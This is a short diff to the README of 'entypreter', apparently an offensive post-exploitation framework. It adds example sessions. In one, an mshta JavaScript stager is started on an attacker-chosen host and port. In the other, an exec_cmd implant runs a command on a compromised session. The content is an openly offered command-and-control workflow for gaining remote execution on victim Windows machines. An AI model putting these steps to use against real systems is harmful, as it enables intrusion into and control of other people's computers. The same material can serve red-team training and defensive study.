@@ -20,13 +20,25 @@
 
 # The entypreter examples
 
+## Starting stager
+
 > entypreter
 
     (entypreter: sta/js/mshta)# info
     (entypreter: sta/js/mshta)# set SRVHOST [LHOST]
     (entypreter: sta/js/mshta)# set SRVPORT [LPORT]
     (entypreter: sta/js/mshta)# run
+    
+## Starting implant
 
+> entypreter
+
+    (entypreter: sta/js/mshta)# use implant/manage/exec_cmd
+    (entypreter: implant/manage/exec_cmd)# info
+    (entypreter: implant/manage/exec_cmd)# set CMD ipconfig
+    (entypreter: implant/manage/exec_cmd)# set session [SESSION]
+    (entypreter: implant/manage/exec_cmd)# run
+    
 ***
 
 # Stagers and implants
